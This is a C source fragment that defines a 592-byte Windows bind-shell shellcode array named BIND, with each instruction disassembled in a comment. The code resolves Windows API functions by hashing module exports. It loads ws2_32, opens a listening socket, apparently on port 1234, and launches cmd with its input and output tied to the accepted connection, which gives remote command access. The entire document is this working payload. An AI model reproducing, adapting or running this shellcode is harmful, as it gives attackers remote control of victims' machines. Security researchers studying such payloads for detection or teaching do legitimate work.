
#define BIND_SIZE 592

char BIND[] = {
  /* 0000 */ "\x53"                     /* push rbx                    */
  /* 0001 */ "\x55"                     /* push rbp                    */
  /* 0002 */ "\x57"                     /* push rdi                    */
  /* 0003 */ "\x56"                     /* push rsi                    */
  /* 0004 */ "\xeb\x18"                 /* jmp 0x1e                    */
  /* 0006 */ "\x5e"                     /* pop rsi                     */
  /* 0007 */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 0009 */ "\xb1\x82"                 /* mov cl, 0x82                */
  /* 000B */ "\x48\x8d\x2c\x0e"         /* lea rbp, [rsi+rcx]          */
  /* 000F */ "\xb1\x0d"                 /* mov cl, 0xd                 */
  /* 0011 */ "\xb5\x01"                 /* mov ch, 0x1                 */
  /* 0013 */ "\x48\x8d\x14\x0e"         /* lea rdx, [rsi+rcx]          */
  /* 0017 */ "\xff\xd2"                 /* call rdx                    */
  /* 0019 */ "\x5e"                     /* pop rsi                     */
  /* 001A */ "\x5f"                     /* pop rdi                     */
  /* 001B */ "\x5d"                     /* pop rbp                     */
  /* 001C */ "\x5b"                     /* pop rbx                     */
  /* 001D */ "\xc3"                     /* ret                         */
  /* 001E */ "\xe8\xe3\xff\xff\xff"     /* call 0x6                    */
  /* 0023 */ "\x51"                     /* push rcx                    */
  /* 0024 */ "\x52"                     /* push rdx                    */
  /* 0025 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 0027 */ "\x99"                     /* cdq                         */
  /* 0028 */ "\xac"                     /* lodsb                       */
  /* 0029 */ "\x84\xc0"                 /* test al, al                 */
  /* 002B */ "\x74\x15"                 /* jz 0x42                     */
  /* 002D */ "\x0c\x20"                 /* or al, 0x20                 */
  /* 002F */ "\x30\xc2"                 /* xor dl, al                  */
  /* 0031 */ "\x6a\x08"                 /* push 0x8                    */
  /* 0033 */ "\x59"                     /* pop rcx                     */
  /* 0034 */ "\xd1\xea"                 /* shr edx, 1                  */
  /* 0036 */ "\x73\x06"                 /* jae 0x3e                    */
  /* 0038 */ "\x81\xf2\x78\x3b\xf6\x82" /* xor edx, 0x82f63b78         */
  /* 003E */ "\xe2\xf4"                 /* loop 0x34                   */
  /* 0040 */ "\xeb\xe6"                 /* jmp 0x28                    */
  /* 0042 */ "\x92"                     /* xchg edx, eax               */
  /* 0043 */ "\x5a"                     /* pop rdx                     */
  /* 0044 */ "\x59"                     /* pop rcx                     */
  /* 0045 */ "\xc3"                     /* ret                         */
  /* 0046 */ "\x57"                     /* push rdi                    */
  /* 0047 */ "\x53"                     /* push rbx                    */
  /* 0048 */ "\x52"                     /* push rdx                    */
  /* 0049 */ "\x56"                     /* push rsi                    */
  /* 004A */ "\x03\x55\x3c"             /* add edx, [rbp+0x3c]         */
  /* 004D */ "\x8b\x4c\x15\x28"         /* mov ecx, [rbp+rdx+0x28]     */
  /* 0051 */ "\xe3\x4d"                 /* jrcxz 0xa0                  */
  /* 0053 */ "\x56"                     /* push rsi                    */
  /* 0054 */ "\x8b\x74\x0d\x0c"         /* mov esi, [rbp+rcx+0xc]      */
  /* 0058 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 005B */ "\xe8\xc3\xff\xff\xff"     /* call 0x23                   */
  /* 0060 */ "\x97"                     /* xchg edi, eax               */
  /* 0061 */ "\x8b\x74\x0d\x1c"         /* mov esi, [rbp+rcx+0x1c]     */
  /* 0065 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0068 */ "\x8b\x54\x0d\x20"         /* mov edx, [rbp+rcx+0x20]     */
  /* 006C */ "\x48\x01\xea"             /* add rdx, rbp                */
  /* 006F */ "\x8b\x5c\x0d\x24"         /* mov ebx, [rbp+rcx+0x24]     */
  /* 0073 */ "\x48\x01\xeb"             /* add rbx, rbp                */
  /* 0076 */ "\x8b\x4c\x0d\x18"         /* mov ecx, [rbp+rcx+0x18]     */
  /* 007A */ "\x58"                     /* pop rax                     */
  /* 007B */ "\xe3\x23"                 /* jrcxz 0xa0                  */
  /* 007D */ "\x53"                     /* push rbx                    */
  /* 007E */ "\x56"                     /* push rsi                    */
  /* 007F */ "\x93"                     /* xchg ebx, eax               */
  /* 0080 */ "\x8b\x74\x8a\xfc"         /* mov esi, [rdx+rcx*4-0x4]    */
  /* 0084 */ "\x48\x01\xee"             /* add rsi, rbp                */
  /* 0087 */ "\xe8\x97\xff\xff\xff"     /* call 0x23                   */
  /* 008C */ "\x01\xf8"                 /* add eax, edi                */
  /* 008E */ "\x39\xd8"                 /* cmp eax, ebx                */
  /* 0090 */ "\xe0\xee"                 /* loopne 0x80                 */
  /* 0092 */ "\x5e"                     /* pop rsi                     */
  /* 0093 */ "\x5b"                     /* pop rbx                     */
  /* 0094 */ "\x75\x0a"                 /* jnz 0xa0                    */
  /* 0096 */ "\x0f\xb7\x1c\x4b"         /* movzx ebx, word [rbx+rcx*2] */
  /* 009A */ "\x8b\x0c\x9e"             /* mov ecx, [rsi+rbx*4]        */
  /* 009D */ "\x48\x01\xe9"             /* add rcx, rbp                */
  /* 00A0 */ "\x5e"                     /* pop rsi                     */
  /* 00A1 */ "\x5a"                     /* pop rdx                     */
  /* 00A2 */ "\x5b"                     /* pop rbx                     */
  /* 00A3 */ "\x5f"                     /* pop rdi                     */
  /* 00A4 */ "\xc3"                     /* ret                         */
  /* 00A5 */ "\x0f\xb6\xc9"             /* movzx ecx, cl               */
  /* 00A8 */ "\x51"                     /* push rcx                    */
  /* 00A9 */ "\x53"                     /* push rbx                    */
  /* 00AA */ "\x57"                     /* push rdi                    */
  /* 00AB */ "\x56"                     /* push rsi                    */
  /* 00AC */ "\x55"                     /* push rbp                    */
  /* 00AD */ "\x96"                     /* xchg esi, eax               */
  /* 00AE */ "\x31\xdb"                 /* xor ebx, ebx                */
  /* 00B0 */ "\xf7\xe3"                 /* mul ebx                     */
  /* 00B2 */ "\xb3\x30"                 /* mov bl, 0x30                */
  /* 00B4 */ "\x48\x79\x0f"             /* jns 0xc6                    */
  /* 00B7 */ "\x64\x8b\x3b"             /* mov edi, [fs:rbx]           */
  /* 00BA */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00BD */ "\x8b\x7f\x0c"             /* mov edi, [rdi+0xc]          */
  /* 00C0 */ "\xb3\x18"                 /* mov bl, 0x18                */
  /* 00C2 */ "\xb2\x50"                 /* mov dl, 0x50                */
  /* 00C4 */ "\xeb\x1b"                 /* jmp 0xe1                    */
  /* 00C6 */ "\xb2\x60"                 /* mov dl, 0x60                */
  /* 00C8 */ "\x65\x48\x8b\x3a"         /* mov rdi, [gs:rdx]           */
  /* 00CC */ "\x8b\x7f\x18"             /* mov edi, [rdi+0x18]         */
  /* 00CF */ "\x8b\x7f\x10"             /* mov edi, [rdi+0x10]         */
  /* 00D2 */ "\xeb\x0d"                 /* jmp 0xe1                    */
  /* 00D4 */ "\xe8\x6d\xff\xff\xff"     /* call 0x46                   */
  /* 00D9 */ "\x48\x85\xc9"             /* test rcx, rcx               */
  /* 00DC */ "\x75\x0e"                 /* jnz 0xec                    */
  /* 00DE */ "\x48\x8b\x3f"             /* mov rdi, [rdi]              */
  /* 00E1 */ "\x48\x8b\x2c\x1f"         /* mov rbp, [rdi+rbx]          */
  /* 00E5 */ "\x48\x85\xed"             /* test rbp, rbp               */
  /* 00E8 */ "\x75\xea"                 /* jnz 0xd4                    */
  /* 00EA */ "\x55"                     /* push rbp                    */
  /* 00EB */ "\x59"                     /* pop rcx                     */
  /* 00EC */ "\x5d"                     /* pop rbp                     */
  /* 00ED */ "\x5e"                     /* pop rsi                     */
  /* 00EE */ "\x5f"                     /* pop rdi                     */
  /* 00EF */ "\x5b"                     /* pop rbx                     */
  /* 00F0 */ "\x5a"                     /* pop rdx                     */
  /* 00F1 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 00F3 */ "\x48\x79\x02"             /* jns 0xf8                    */
  /* 00F6 */ "\xff\xe1"                 /* jmp rcx                     */
  /* 00F8 */ "\x41\x89\xd4"             /* mov r12d, edx               */
  /* 00FB */ "\x49\x89\xcb"             /* mov r11, rcx                */
  /* 00FE */ "\x41\x5f"                 /* pop r15                     */
  /* 0100 */ "\x45\x85\xe4"             /* test r12d, r12d             */
  /* 0103 */ "\x74\x1c"                 /* jz 0x121                    */
  /* 0105 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0109 */ "\x59"                     /* pop rcx                     */
  /* 010A */ "\x74\x15"                 /* jz 0x121                    */
  /* 010C */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0110 */ "\x5a"                     /* pop rdx                     */
  /* 0111 */ "\x74\x0e"                 /* jz 0x121                    */
  /* 0113 */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0117 */ "\x41\x58"                 /* pop r8                      */
  /* 0119 */ "\x74\x06"                 /* jz 0x121                    */
  /* 011B */ "\x41\x59"                 /* pop r9                      */
  /* 011D */ "\x41\x83\xec\x01"         /* sub r12d, 0x1               */
  /* 0121 */ "\x48\x83\xec\x20"         /* sub rsp, 0x20               */
  /* 0125 */ "\x41\xff\xd3"             /* call r11                    */
  /* 0128 */ "\x4a\x8d\x64\xe4\x20"     /* lea rsp, [rsp+r12*8+0x20]   */
  /* 012D */ "\x41\x57"                 /* push r15                    */
  /* 012F */ "\xc3"                     /* ret                         */
  /* 0130 */ "\x31\xd2"                 /* xor edx, edx                */
  /* 0132 */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 0134 */ "\x48\x29\xd4"             /* sub rsp, rdx                */
  /* 0137 */ "\x54"                     /* push rsp                    */
  /* 0138 */ "\x5f"                     /* pop rdi                     */
  /* 0139 */ "\x57"                     /* push rdi                    */
  /* 013A */ "\xb8\x77\x73\x32\x5f"     /* mov eax, 0x5f327377         */
  /* 013F */ "\xab"                     /* stosd                       */
  /* 0140 */ "\xb8\xcc\xcd\xff\xff"     /* mov eax, 0xffffcdcc         */
  /* 0145 */ "\xf7\xd0"                 /* not eax                     */
  /* 0147 */ "\xab"                     /* stosd                       */
  /* 0148 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 014A */ "\xb8\x02\x66\x1d\x7e"     /* mov eax, 0x7e1d6602         */
  /* 014F */ "\xff\xd5"                 /* call rbp                    */
  /* 0151 */ "\x57"                     /* push rdi                    */
  /* 0152 */ "\x6a\x02"                 /* push 0x2                    */
  /* 0154 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0156 */ "\xb8\xe6\x2c\x63\xca"     /* mov eax, 0xca632ce6         */
  /* 015B */ "\xff\xd5"                 /* call rbp                    */
  /* 015D */ "\x50"                     /* push rax                    */
  /* 015E */ "\x50"                     /* push rax                    */
  /* 015F */ "\x50"                     /* push rax                    */
  /* 0160 */ "\x50"                     /* push rax                    */
  /* 0161 */ "\x6a\x01"                 /* push 0x1                    */
  /* 0163 */ "\x6a\x02"                 /* push 0x2                    */
  /* 0165 */ "\xb1\x06"                 /* mov cl, 0x6                 */
  /* 0167 */ "\xb8\xc5\x75\xe0\xc8"     /* mov eax, 0xc8e075c5         */
  /* 016C */ "\xff\xd5"                 /* call rbp                    */
  /* 016E */ "\x93"                     /* xchg ebx, eax               */
  /* 016F */ "\x6a\x10"                 /* push 0x10                   */
  /* 0171 */ "\x57"                     /* push rdi                    */
  /* 0172 */ "\xb8\xfd\xff\xfb\x2d"     /* mov eax, 0x2dfbfffd         */
  /* 0177 */ "\xf7\xd0"                 /* not eax                     */
  /* 0179 */ "\xab"                     /* stosd                       */
  /* 017A */ "\xb8\xff\xff\xff\xff"     /* mov eax, 0xffffffff         */
  /* 017F */ "\xf7\xd0"                 /* not eax                     */
  /* 0181 */ "\xab"                     /* stosd                       */
  /* 0182 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 0184 */ "\xab"                     /* stosd                       */
  /* 0185 */ "\xab"                     /* stosd                       */
  /* 0186 */ "\x53"                     /* push rbx                    */
  /* 0187 */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 0189 */ "\xb8\xd8\xa1\xc4\x51"     /* mov eax, 0x51c4a1d8         */
  /* 018E */ "\xff\xd5"                 /* call rbp                    */
  /* 0190 */ "\x85\xc0"                 /* test eax, eax               */
  /* 0192 */ "\x75\x2c"                 /* jnz 0x1c0                   */
  /* 0194 */ "\x50"                     /* push rax                    */
  /* 0195 */ "\x53"                     /* push rbx                    */
  /* 0196 */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 0198 */ "\xb8\x85\x8d\x15\x4e"     /* mov eax, 0x4e158d85         */
  /* 019D */ "\xff\xd5"                 /* call rbp                    */
  /* 019F */ "\x85\xc0"                 /* test eax, eax               */
  /* 01A1 */ "\x75\x1d"                 /* jnz 0x1c0                   */
  /* 01A3 */ "\x50"                     /* push rax                    */
  /* 01A4 */ "\x50"                     /* push rax                    */
  /* 01A5 */ "\x53"                     /* push rbx                    */
  /* 01A6 */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 01A8 */ "\xb8\x89\x66\x45\xb1"     /* mov eax, 0xb1456689         */
  /* 01AD */ "\xff\xd5"                 /* call rbp                    */
  /* 01AF */ "\x85\xc0"                 /* test eax, eax               */
  /* 01B1 */ "\x78\x0d"                 /* js 0x1c0                    */
  /* 01B3 */ "\x96"                     /* xchg esi, eax               */
  /* 01B4 */ "\xeb\x1c"                 /* jmp 0x1d2                   */
  /* 01B6 */ "\x56"                     /* push rsi                    */
  /* 01B7 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 01B9 */ "\xb8\x3c\xd3\xca\xb2"     /* mov eax, 0xb2cad33c         */
  /* 01BE */ "\xff\xd5"                 /* call rbp                    */
  /* 01C0 */ "\x53"                     /* push rbx                    */
  /* 01C1 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 01C3 */ "\xb8\x3c\xd3\xca\xb2"     /* mov eax, 0xb2cad33c         */
  /* 01C8 */ "\xff\xd5"                 /* call rbp                    */
  /* 01CA */ "\x31\xd2"                 /* xor edx, edx                */
  /* 01CC */ "\xb6\x02"                 /* mov dh, 0x2                 */
  /* 01CE */ "\x48\x01\xd4"             /* add rsp, rdx                */
  /* 01D1 */ "\xc3"                     /* ret                         */
  /* 01D2 */ "\x6a\x68"                 /* push 0x68                   */
  /* 01D4 */ "\x58"                     /* pop rax                     */
  /* 01D5 */ "\x57"                     /* push rdi                    */
  /* 01D6 */ "\xab"                     /* stosd                       */
  /* 01D7 */ "\x91"                     /* xchg ecx, eax               */
  /* 01D8 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01DA */ "\xf3\xaa"                 /* rep stosb                   */
  /* 01DC */ "\x5f"                     /* pop rdi                     */
  /* 01DD */ "\x57"                     /* push rdi                    */
  /* 01DE */ "\x48\x78\x02"             /* js 0x1e3                    */
  /* 01E1 */ "\xb1\x18"                 /* mov cl, 0x18                */
  /* 01E3 */ "\x48\x8d\x7c\x0f\x38"     /* lea rdi, [rdi+rcx+0x38]     */
  /* 01E8 */ "\xb1\x03"                 /* mov cl, 0x3                 */
  /* 01EA */ "\x89\x37"                 /* mov [rdi], esi              */
  /* 01EC */ "\x48\xaf"                 /* scasq                       */
  /* 01EE */ "\xe2\xfa"                 /* loop 0x1ea                  */
  /* 01F0 */ "\x31\xc0"                 /* xor eax, eax                */
  /* 01F2 */ "\x48\x78\x02"             /* js 0x1f7                    */
  /* 01F5 */ "\xb1\x10"                 /* mov cl, 0x10                */
  /* 01F7 */ "\x5a"                     /* pop rdx                     */
  /* 01F8 */ "\xff\x44\x0a\x2d"         /* inc dword [rdx+rcx+0x2d]    */
  /* 01FC */ "\xb8\x9c\x92\x9b\xff"     /* mov eax, 0xff9b929c         */
  /* 0201 */ "\xf7\xd0"                 /* not eax                     */
  /* 0203 */ "\x57"                     /* push rdi                    */
  /* 0204 */ "\xab"                     /* stosd                       */
  /* 0205 */ "\x58"                     /* pop rax                     */
  /* 0206 */ "\x57"                     /* push rdi                    */
  /* 0207 */ "\x52"                     /* push rdx                    */
  /* 0208 */ "\x31\xc9"                 /* xor ecx, ecx                */
  /* 020A */ "\x6a\x08"                 /* push 0x8                    */
  /* 020C */ "\x5a"                     /* pop rdx                     */
  /* 020D */ "\xc1\xe2\x18"             /* shl edx, 0x18               */
  /* 0210 */ "\x51"                     /* push rcx                    */
  /* 0211 */ "\x51"                     /* push rcx                    */
  /* 0212 */ "\x52"                     /* push rdx                    */
  /* 0213 */ "\x6a\x01"                 /* push 0x1                    */
  /* 0215 */ "\x51"                     /* push rcx                    */
  /* 0216 */ "\x51"                     /* push rcx                    */
  /* 0217 */ "\x50"                     /* push rax                    */
  /* 0218 */ "\x51"                     /* push rcx                    */
  /* 0219 */ "\xb1\x0a"                 /* mov cl, 0xa                 */
  /* 021B */ "\xb8\xb1\xfe\xc6\x5f"     /* mov eax, 0x5fc6feb1         */
  /* 0220 */ "\xff\xd5"                 /* call rbp                    */
  /* 0222 */ "\xf7\xd8"                 /* neg eax                     */
  /* 0224 */ "\x79\x90"                 /* jns 0x1b6                   */
  /* 0226 */ "\x50"                     /* push rax                    */
  /* 0227 */ "\x8b\x07"                 /* mov eax, [rdi]              */
  /* 0229 */ "\x50"                     /* push rax                    */
  /* 022A */ "\xb1\x02"                 /* mov cl, 0x2                 */
  /* 022C */ "\xb8\x7e\x6a\xe6\x31"     /* mov eax, 0x31e66a7e         */
  /* 0231 */ "\xff\xd5"                 /* call rbp                    */
  /* 0233 */ "\xff\x37"                 /* push qword [rdi]            */
  /* 0235 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 0237 */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 023C */ "\xff\xd5"                 /* call rbp                    */
  /* 023E */ "\x48\xaf"                 /* scasq                       */
  /* 0240 */ "\xff\x37"                 /* push qword [rdi]            */
  /* 0242 */ "\xb1\x01"                 /* mov cl, 0x1                 */
  /* 0244 */ "\xb8\xd6\xeb\x33\x26"     /* mov eax, 0x2633ebd6         */
  /* 0249 */ "\xff\xd5"                 /* call rbp                    */
  /* 024B */ "\xe9\x66\xff\xff\xff"     /* jmp 0x1b6                   */
};